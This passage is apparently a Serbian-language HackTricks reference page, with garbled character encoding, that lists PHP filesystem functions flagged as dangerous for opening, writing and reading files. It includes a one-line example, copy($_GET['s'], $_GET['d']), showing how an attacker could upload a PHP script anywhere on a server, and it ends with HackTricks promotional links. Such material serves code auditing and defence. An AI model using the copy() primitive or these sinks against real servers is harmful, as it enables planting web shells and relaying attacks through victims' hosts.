Prema RATS-u, sve funkcije sistema datoteka u PHP-u su zlonamerne. Neke od njih se ne Äine veoma korisnim napadaÄu. Druge su korisnije nego Å¡to moÅ¾da mislite. Na primer, ako je allow\_url\_fopen=On, tada se URL moÅ¾e koristiti kao putanja do datoteke, pa se pozivom copy($\_GET\['s'], $\_GET\['d']); moÅ¾e otpremiti PHP skripta bilo gde na sistemu. TakoÄ‘e, ako je sajt ranjiv na zahtev poslat putem GET, svaka od ovih funkcija sistema datoteka moÅ¾e biti zloupotrebljena kako bi se kanalisao napad ka drugom hostu preko vaÅ¡eg servera.

**Otvori rukovaoca sistemom datoteka**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Pisanje u sistem datoteka (delimiÄno u kombinaciji sa Äitanjem)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**ÄŒitanje sa fajl sistema**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
